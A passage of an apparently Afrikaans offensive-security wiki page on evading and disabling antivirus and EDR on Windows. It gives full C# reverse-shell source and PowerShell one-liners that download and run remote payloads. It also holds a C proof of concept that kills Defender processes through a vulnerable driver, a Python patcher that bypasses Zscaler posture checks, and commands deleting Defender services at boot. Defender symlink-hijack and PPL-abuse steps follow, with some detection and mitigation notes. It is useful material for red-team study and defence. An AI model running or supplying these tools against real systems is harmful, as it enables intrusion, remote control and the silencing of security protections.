C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Huidige Defender sal die proses baie vinnig beëindig.**

### Compileer ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# reverse shell

Kompileer dit met:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Gebruik dit met:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# met compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C#-obfuskatorslys: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Voorbeeld van die gebruik van Python om injectors te bou:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR vanuit Kernel Space uitskakel

Storm-2603 het ’n klein konsolehulpmiddel genaamd **Antivirus Terminator** gebruik om endpoint-beskerming uit te skakel voordat dit ransomware laat val het. Die hulpmiddel bring sy **eie kwesbare maar *ondertekende* driver** saam en misbruik dit om bevoorregte kernel-bewerkings uit te voer wat selfs AV-dienste met Protected-Process-Light (PPL) nie kan blokkeer nie.<sup>[[12]](#references)</sup>

Belangrike punte
1. **Ondertekende driver**: Die lêer wat na die skyf geskryf word, is `ServiceMouse.sys`, maar die binêre lêer is die wettig ondertekende driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver ’n geldige Microsoft-handtekening het, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Diensinstallasie**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die eerste reël registreer die drywer as ’n **kernel service**, en die tweede begin dit sodat `\\.\ServiceMouse` vanuit gebruikersruimte toeganklik word.
3. **IOCTLs wat deur die drywer blootgestel word**
   | IOCTL-kode | Vermoë                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Beëindig ’n arbitrêre proses volgens PID (word gebruik om Defender/EDR-dienste te beëindig) |
   | `0x990000D0` | Vee ’n arbitrêre lêer op skyf uit |
   | `0x990001D0` | Laai die drywer af en verwyder die diens |

   Minimale C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Waarom dit werk**: BYOVD omseil user-mode-beskermings heeltemal; kode wat in die kernel uitgevoer word, kan *beskermde* prosesse oopmaak, beëindig of met kernel-objekte peuter, ongeag PPL/PP, ELAM of ander hardingskenmerke.

Opsporing / versagting
•  Aktiveer Microsoft se blokkeerlys vir kwesbare drywers (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor die skepping van nuwe *kernel*-dienste en waarsku wanneer ’n drywer uit ’n gids met wêreldwye skryftoegang gelaai word of nie op die allow-list voorkom nie.
•  Hou user-mode-handvatsels na pasgemaakte toestelobjekte dop, gevolg deur verdagte `DeviceIoControl`-oproepe.

### Omseiling van Zscaler Client Connector-houdingskontroles deur binêre pleistering op skyf

Zscaler se **Client Connector** pas toestelhoudingsreëls plaaslik toe en maak op Windows RPC staat om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak ’n volledige omseiling moontlik:

1. Houdingsevaluering vind **heeltemal aan die kliëntkant plaas** (’n boolean word na die bediener gestuur).
2. Interne RPC-eindpunte valideer net dat die uitvoerbare lêer wat koppel **deur Zscaler onderteken is** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Deur **vier ondertekende binêre lêers op skyf te pleister**, kan albei meganismes geneutraliseer word:

| Binêre lêer | Oorspronklike logika wat gepleister is | Resultaat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug, dus slaag elke kontrole |
| `ZSAService.exe` | Indirekte oproep na `WinVerifyTrust` | Vervang met NOP’s ⇒ enige proses (selfs ’n ongetekende een) kan aan die RPC-pype koppel |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integriteitskontroles op die tonnel | Kortgesluit |

Uittreksel van ’n minimale pleisterprogram:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nadat die oorspronklike lêers vervang is en die diensstapel herbegin is:

* **Alle** posture checks vertoon **groen/voldoenend**.
* Ongesiene of gewysigde binaries kan die named-pipe RPC-eindpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk wat deur die Zscaler-beleide gedefinieer word.

Hierdie gevallestudie wys hoe vertrouebesluite wat uitsluitlik aan die kliëntkant geneem word, en eenvoudige handtekeningkontroles met ’n paar byte-patches omseil kan word.

## Misbruik van vertroude funksionaliteit in Microsoft Defender `BTR.sys`

Defender se **Boot-Time Removal**-drywer is ’n nuttige teenvoorbeeld van klassieke BYOVD. `BTR.sys` is ’n wettige Microsoft-ondertekende remediëringskomponent sonder ’n geheuekorrupsie-fout of IOCTL-koppelvlak; nadat administrateurtoegang en `SeLoadDriverPrivilege` verkry is, kan ’n operateur eerder sy private remediëringstransaksie vervals en die bedoelde Ring-0-lêer-/registerbewerkings uitvoer. Dit is ’n **post-kompromie AV/EDR-neutraliseringsprimitief, nie aanvanklike toegang of voorregte-eskalasie nie**, en die drywer kan uit die teiken se eie `MpEngine.dll`-hulpbron `BOOTTIMETOOL` onttrek word, eerder as om ’n opvallende derdeparty-drywer in te voer.<sup>[[36]](#references)</sup>

### Voorbereiding van die eenmalige drywer

Defender skryf die hulpbron gewoonlik as ’n ewekansige `[a-z]{8}.sys`-lêer neer en registreer ’n kerneldiens met ’n soortgelyke naam. `DriverEntry` lees die diens se `Args`-waarde, open die verwysde NTFS ADS, dekripteer en valideer die aksielys, skryf terugvoer, en gee ná suksesvolle uitvoering `0xC0000056` (`STATUS_DELETE_PENDING`) terug sodat die drywer ontlaai in plaas daarvan om inwonend te bly. ’n Vervalste diens het die volgende kenmerkende waardes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Die `:changelist`-stroom bevat een RC4-geënkripteerde blob. Die ontlede bouwe hergebruik ’n vaste sleutel van 256 grepe, dus is enkripsie nie ’n magtigingsgrens nie. ’n Geldige plaintext het ’n globale kop van 24 grepe (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, kop-CRC en ’n transaksie-ID wat van die payload afgelei is), gevolg deur ’n nulbeëindigde UTF-16-terugvo pad en enige aantal items. Elke item het ’n kop van 16 grepe (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) plus aksiespesifieke data wat met **presies vier NUL-grepe** eindig. Elke kop-/data-gebied word afsonderlik met CRC-32-polinoom `0xEDB88320`, aanvanklike toestand `0xFFFFFFFF` en **geen finale XOR** (`~CRC32`) nagegaan; die CRC-toestand word vir elke gebied teruggestel.<sup>[[36]](#references)[[37]](#references)</sup>

Die aanvaarde aksie-ID’s stel hierdie kernel-primitiewe beskikbaar.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Itemdata | Resultaat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Vee ’n lêer uit, ook ’n geslote lêer |
| 2 | `[UTF-16 path]` | Verwyder ’n leë gids |
| 3 | `[Flags][source][destination]` | Skuif ’n lêer na ’n aanvallergekose beskermde pad; ’n leë bestemming beteken uitvee |
| 4 | `[Flags][key path]` | Vee ’n registersleutel rekursief uit |
| 5 | `[Flags][key path + "\\" + value]` | Vee ’n registerwaarde uit |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Skep/dateer ’n registerwaarde op en skep ontbrekende sleutelpaadjies |

Vir aksies 5 en 6 is die skeidingsteken tussen sleutel en waarde op die draad **twee opeenvolgende terugskuinsstrepe**; ’n konvensioneel geformateerde pad sal nie korrek verdeel word nie. Die terugvoerlêer weerspieël meestal die versoek, maar die eerste vier datagrepe van elke item word die resulterende `NTSTATUS`. Vir aksies 1 en 2, wat geen voorste vlagveld het nie, skuif BTR die pad na die vier gereserveerde agterste grepe om plek vir daardie status te maak.<sup>[[36]](#references)</sup>

### `BTR_CLI`-werkvloei en vroeë-selflaaivenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementeer die volledige ketting: onttrek `BTR.sys` uit plaaslike Defender, skep `<random>.sys:changelist` en ’n terugvoerstroom, serialiseer/kontrolesom/enkripteer gekoppelde aksies, skep die diensregistersleutel direk en roep dan `NtLoadDriver` aan vir `-trigger now`, of laat dit as ’n stelselbeginbestuurder vir `-trigger boot`. Direkte registervoorbereiding omseil die gewone SCM-`CreateServiceW`-pad en veroorsaak dus **nie** diensinstallasiegebeurtenis-ID 7045 nie. Artefakte wat deur selflaai geaktiveer word, kan later met `BTR_CLI.exe -cleanup <service_name>` verwyder word.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` is nie bruikbaar nie omdat BTR lêer-I/O vanaf `DriverEntry` uitvoer voordat die bergingstapel en `SystemRoot`-skakel gereed is. `Start=1` plus die hoëprioriteit-`Boot Bus Extender`-groep laat dit eerder in Fase 1 uitvoer: NTFS is bruikbaar, maar baie sekuriteitsdrywers wat met die stelsel begin en EDR-dienste in gebruikersmodus het nog nie geïnisialiseer nie. Opstartfilters soos `WdFilter` is moontlik reeds gelaai, maar BTR kan hul binêre lêers of dienskonfigurasie verwyder voordat die volgende begin, en kan diensuitvoerbare lêers verwyder voordat SCM hulle begin. ELAM maak nie hierdie gaping toe nie omdat BTR ná die opstartevaluering loop en ’n geldige Microsoft-handtekening het.<sup>[[36]](#references)</sup>

Verskeie aksies word in een transaksie uitgevoer. Die PoC voeg Aksie 1 vooraf in vir die hardgekodeerde `\SystemRoot\Temp\BootClean.log`: BTR skep hierdie log, verwerk dan sy eie versoek om dit te verwyder en verwyder dit voordat dit ontlaai. Dit verminder bewyse, terwyl terugvoer in `<random>.sys:<random>.dat` geplaas word sodat die drywer en albei strome saam verwyder kan word.<sup>[[36]](#references)[[37]](#references)</sup>

### Opsporingskorrelasies met ’n hoë seinwaarde

Reëls wat slegs op handtekeninge staatmaak en die Microsoft-lys van geblokkeerde kwesbare drywers spreek nie misbruik van BTR se beoogde funksionaliteit aan nie. Verkies hierdie gedragskorrelasies, maar onderskei terselfdertyd wettige Defender-herkoms van ’n willekeurige lanseerder.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die skepping van `.sys:changelist` is universeel vir BTR-staging. ’n `.dat` ADS wat aan dieselfde `.sys` gekoppel is, is besonder verdag omdat wettige Defender terugvoer gewoonlik onder `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` plaas.
- **Sysmon 12/13 sonder System 7045:** korreleer die direkte skepping van `HKLM\SYSTEM\CurrentControlSet\Services\<random>` met `Args=...:changelist` en `Group=Boot Bus Extender` wanneer daar geen ooreenstemmende SCM-installasiegebeurtenis is nie.
- **Sysmon 6 -> 23:** korreleer die laai van ’n bekende BTR-drywer uit ’n nie-Defender-herkoms met daaropvolgende lêerverwydering wat aan `System`/PID 4 toegeskryf word, veral vir sekuriteitsbinêre lêers.
- **Sysmon 11 -> 23:** waarsku oor die vinnige skepping en verwydering van `\SystemRoot\Temp\BootClean.log` deur `System`/PID 4.
- Beperk en oudit die toekenning/aktivering van `SeLoadDriverPrivilege`; ’n Microsoft-handtekening alleen is nie voldoende rede vir vertroue wanneer ’n sekuriteitsnutsding se drywer deur `cmd.exe`, PowerShell of ’n onbekende proses gestage word nie.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te peuter

Protected Process Light (PPL) dwing ’n hiërargie van ondertekenaar/vlak af, sodat slegs beskermde prosesse op dieselfde of ’n hoër vlak met mekaar kan peuter. As jy ’n PPL-geaktiveerde binêre lêer wettig kan begin en die argumente daarvan kan beheer, kan jy onskadelike funksionaliteit (bv. logging) omskep in ’n beperkte, PPL-gesteunde skryfbewerkingsprimitief teen beskermde vouers wat deur AV/EDR gebruik word.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Wat ’n proses as PPL laat loop
- Die teiken-EXE (en enige gelaaide DLL’s) moet met ’n PPL-geskikte EKU onderteken wees.
- Die proses moet met CreateProcess geskep word deur die vlae te gebruik: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- ’n Versoenbare beskermingsvlak moet aangevra word wat met die binêre lêer se ondertekenaar ooreenstem (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir teenwanware-ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal tydens skepping misluk.

Sien ook hier ’n breër inleiding tot PP/PPL en LSASS-beskerming:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Lanseerdernutsmiddels
- Oopbronhelper: CreateProcessAsPPL (kies die beskermingsvlak en stuur argumente aan die teiken-EXE deur):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Gebruikspatroon:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN-primitive: ClipUp.exe
- Die getekende stelselbinêre lêer `C:\Windows\System32\ClipUp.exe` begin ’n nuwe instansie van homself en aanvaar ’n parameter om ’n loglêer na ’n pad wat deur die oproeper gespesifiseer word, te skryf.
- Wanneer dit as ’n PPL-proses geloods word, vind die lêerskryfaksie met PPL-ondersteuning plaas.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3-kortpaaie om na normaalweg beskermde liggings te verwys.

8.3-kortpadhelpers
- Lys kortname: `dir /x` in elke ouergids.
- Bepaal die kort pad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Misbruikketting (abstrak)
1) Begin die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur ’n lanseerder te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp-logpadargument deur om ’n lêer in ’n beskermde AV-gids te skep (bv. Defender Platform). Gebruik 8.3-kortname indien nodig.
3) As die teikenbinêre lêer gewoonlik deur die AV oopgemaak/gesluit gehou word terwyl dit loop (bv. MsMpEng.exe), skeduleer die skryfaksie tydens die selflaai voordat die AV begin deur ’n outomatiese begin-diens te installeer wat betroubaar vroeër loop. Verifieer die selflaai-volgorde met Process Monitor (selflaailogboekhouding).
4) Met die herlaai vind die PPL-ondersteunde skryfaksie plaas voordat die AV sy binêre lêers sluit, wat die teikenlêer beskadig en verhoed dat dit begin.

Voorbeeldaanroep (paaie vir veiligheid weggelaat/verkort):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notas en beperkings
- Jy kan nie die inhoud beheer wat ClipUp skryf nie, net waar dit geplaas word; die primitief is geskik vir korrupsie eerder as presiese inhoudsinspuiting.
- Vereis plaaslike admin/SYSTEM om ’n diens te installeer/te begin, asook ’n herlaaivenster.
- Tydsberekening is krities: die teiken moet nie oop wees nie; uitvoering tydens opstart vermy lêerslotte.

Opsporing
- Proseskepping van `ClipUp.exe` met ongewone argumente, veral wanneer dit deur nie-standaard lanseerders as ouerproses begin word, rondom opstart.
- Nuwe dienste wat ingestel is om verdagte binaries outomaties te begin en konsekwent voor Defender/AV te begin. Ondersoek dienskepping/-wysiging voor Defender-opstartfoute.
- Lêerintegriteitmonitering op Defender-binaries/Platform-gidse; onverwagte lêerskeppings/-wysigings deur prosesse met beskermde-prosesvlae.
- ETW/EDR-telemetrie: soek na prosesse wat met `CREATE_PROTECTED_PROCESS` geskep is en afwykende PPL-vlakgebruik deur nie-AV-binaries.

Versagtingsmaatreëls
- WDAC/Code Integrity: beperk watter ondertekende binaries as PPL mag loop en onder watter ouerprosesse; blokkeer ClipUp-aanroepe buite wettige kontekste.
- Diensbestuur: beperk die skep/wysiging van dienste wat outomaties begin en monitor manipulasie van die beginvolgorde.
- Maak seker dat Defender se peuterbeskerming en vroeëlaaibeskerming geaktiveer is; ondersoek opstartfoute wat op binêre korrupsie dui.
- Oorweeg dit om 8.3-kortnaamgenerering af te skakel op volumes wat sekuriteitsnutsmiddels huisves, indien dit met jou omgewing versoenbaar is (toets dit deeglik).

## Peuter met Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waaruit dit loop deur subgidse onder die volgende pad te enumereer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawestring (bv. `4.18.25070.5-0`), en begin dan die Defender-diensprosesse daarvandaan (terwyl die diens-/registerpaaie dienooreenkomstig opgedateer word). Hierdie keuse vertrou op gidsinskrywings, insluitend gidsherontledingspunte (simboliese skakels). ’n Administrateur kan dit benut om Defender na ’n pad te herlei wat deur ’n aanvaller skryfbaar is en DLL sideloading of diensontwrigting te bewerkstellig.<sup>[[21]](#references)[[22]](#references)</sup>

Voorvereistes
- Plaaslike Administrateur (nodig om gidse/simboliese skakels onder die Platform-gids te skep)
- Die vermoë om te herlaai of Defender-platformherkeuse te aktiveer (diensherbegin tydens opstart)
- Slegs ingeboude nutsmiddels word vereis (`mklink`)

Waarom dit werk
- Defender blokkeer skryfbewerkings in sy eie gidse, maar sy platformkeuse vertrou op gidsinskrywings en kies die leksikografies hoogste weergawe sonder om te valideer of die teiken na ’n beskermde/betroubare pad verwys.

Stap vir stap (voorbeeld)
1) Berei ’n skryfbare kloon van die huidige platformgids voor, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep ’n directory symlink met ’n hoër weergawe binne Platform wat na jou vouer wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Snellerkeuse (herlaai word aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die herlei pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` en die dienskonfigurasie/register te sien wat na daardie ligging verwys.

Post-exploitation-opsies
- DLL sideloading/code execution: Plaas of vervang DLL’s wat Defender uit sy toepassingsgids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Diensstop/ontsegging: Verwyder die weergawe-simboliese skakel sodat die gekonfigureerde pad met die volgende begin nie opgelos kan word nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Let daarop dat hierdie tegniek nie op sy eie voorregte-eskalasie bied nie; dit vereis admin-regte.

## API/IAT Hooking + Call-Stack Spoofing met PIC (Crystal Kit-styl)

Red teams kan runtime-evasion uit die C2-implant en na die teikenmodule self verskuif deur die Import Address Table (IAT) daarvan te hook en geselekteerde API's deur aanvallerbeheerde, posisie-onafhanklike kode (PIC) te stuur. Dit veralgemeen evasion buite die klein API-oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post-exploitation-DLL's.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Benadering op hoë vlak
- Stage 'n PIC-blob saam met die teikenmodule met behulp van 'n reflective loader (voorafgevoeg of as metgesel). Die PIC moet selfstandig en posisie-onafhanklik wees.
- Terwyl die host-DLL laai, deurloop sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT-inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) om na dun PIC-wrappers te wys.
- Elke PIC-wrapper voer evasion uit voordat dit die regte API-adres met 'n tail call aanroep. Tipiese evasions sluit in:
  - Memory mask/unmask rondom die aanroep (bv. enkripteer beacon-streke, RWX→RX, verander bladsynamme/-toestemmings) en herstel dit ná die aanroep.
  - Call-stack spoofing: bou 'n onskadelike stack en skakel oor na die teiken-API sodat call-stack-analise die verwagte frames vind.<sup>[[9]](#references)</sup>
- Voer vir versoenbaarheid 'n koppelvlak uit sodat 'n Aggressor-script (of ekwivalent) kan registreer watter API's vir Beacon, BOFs en post-ex-DLL's gehook moet word.

Waarom IAT-hooking hier
- Werk vir enige kode wat die gehookte import gebruik, sonder om tool-kode te wysig of daarop staat te maak dat Beacon spesifieke API's proxy.
- Dek post-ex-DLL's: deur LoadLibrary* te hook, kan jy modulelaaie onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde masking/stack-evasion op hul API-aanroepe toepas.
- Herstel betroubare gebruik van post-ex-opdragte wat prosesse skep teen call-stack-gebaseerde opsporing deur CreateProcessA/W te wrap.

Minimale IAT-hook-skets (x64 C/C++-pseudokode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Pas die patch toe ná relocations/ASLR en voor die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking tydens die DllMain van die gelaaide module.
- Hou wrappers klein en PIC-safe; resolveer die ware API via die oorspronklike IAT-waarde wat jy vasgelê het voordat jy patch, of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en vermy om bladsye skryfbaar én uitvoerbaar te laat.

Call-stack spoofing-stub
- Draugr-styl PIC-stubs bou ’n vals oproepketting (return addresses in benign modules) en pivot dan na die ware API.
- Dit omseil detections wat kanonieke stacks van Beacon/BOFs na sensitiewe APIs verwag.
- Kombineer dit met stack cutting/stack stitching-tegnieke om binne verwagte frames te land voor die API-proloog.

Operasionele integrasie
- Voeg die reflective loader vooraan post-ex-DLLs in sodat die PIC en hooks outomaties initialiseer wanneer die DLL gelaai word.
- Gebruik ’n Aggressor-script om teiken-APIs te registreer sodat Beacon en BOFs deursigtig by dieselfde evasion-pad baat vind sonder kodeveranderinge.

Detection/DFIR-oorwegings
